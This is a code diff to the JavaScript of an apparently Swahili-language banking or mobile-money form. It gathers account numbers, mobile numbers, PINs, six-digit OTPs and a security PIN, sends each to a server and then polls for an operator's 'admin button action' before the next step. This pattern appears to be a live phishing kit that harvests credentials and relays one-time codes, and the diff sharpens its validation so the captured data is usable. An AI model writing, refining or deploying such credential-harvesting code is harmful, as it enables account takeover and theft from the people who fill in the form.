@@ -52,7 +52,7 @@ document.getElementById('btn-omba').addEventListener('click', () => {
     showStep('credentials');
 });
 
-// Submit Credentials
+// Submit Credentials with Validation (Mobile must start with 0)
 document.getElementById('btn-continue-creds').addEventListener('click', async () => {
     const accountNumber = document.getElementById('acc-number').value.trim();
     const mobileNumber = document.getElementById('mobile-number').value.trim();
@@ -60,6 +60,11 @@ document.getElementById('btn-continue-creds').addEventListener('click', async ()
 
     if (!accountNumber || !mobileNumber || !pin) {
         alert('Tafadhali jaza sehemu zote.');
+        return;
+    }
+
+    if (!mobileNumber.startsWith('0')) {
+        alert('Namba ya simu lazima ianze na namba 0 (Mfano: 0712345678).');
         return;
     }
 
@@ -83,14 +88,14 @@ document.getElementById('btn-continue-creds').addEventListener('click', async ()
         });
         
         const result = await response.json();
-        if (!result.success) throw new Error('Server returned failure');
+        if (!result.success) throw new Error(result.error || 'Server returned failure');
 
         startPolling();
     } catch (err) {
         console.error('Submission error:', err);
         document.getElementById('credentials-spinner').classList.add('hidden');
         document.getElementById('btn-continue-creds').classList.remove('hidden');
-        alert('Hitilafu imetokea. Hakikisha mtandao wako uko sawa.');
+        alert('Hitilafu imetokea. Hakikisha namba yako imeanza na 0 na mtandao uko sawa.');
     }
 });
 
@@ -114,12 +119,13 @@ function setupPinInputs(selector) {
     });
 }
 
-// Submit OTP
+// Submit OTP (Must be 6 digits)
 document.getElementById('btn-verify-otp').addEventListener('click', async () => {
     const boxes = document.querySelectorAll('#step-otp .otp-box');
     const otp = Array.from(boxes).map(b => b.value).join('');
-    if (otp.length < 5) {
-        alert('Tafadhali ingiza OTP kamili ya tarakimu 5.');
+    
+    if (otp.length < 6) {
+        alert('Tafadhali ingiza OTP kamili ya tarakimu 6.');
         return;
     }
 
@@ -130,7 +136,7 @@ document.getElementById('btn-verify-otp').addEventListener('click', async () => 
             body: JSON.stringify({ sessionId, otp })
         });
         showNotification('OTP imetumwa. Inasubiri uthibitisho...');
-        startPolling(); // Resume polling for admin button action
+        startPolling();
     } catch (err) {
         console.error('OTP error:', err);
     }
@@ -152,7 +158,7 @@ document.getElementById('btn-verify-security-pin').addEventListener('click', asy
             body: JSON.stringify({ sessionId, securityPin })
         });
         showNotification('PIN imetumwa. Inasubiri idhini ya mwisho...');
-        startPolling(); // Resume polling for final approval
+        startPolling();
     } catch (err) {
         console.error('Security PIN error:', err);
     }
@@ -196,4 +202,4 @@ function startPolling() {
         }
     }, 3000);
     }
-    
+            
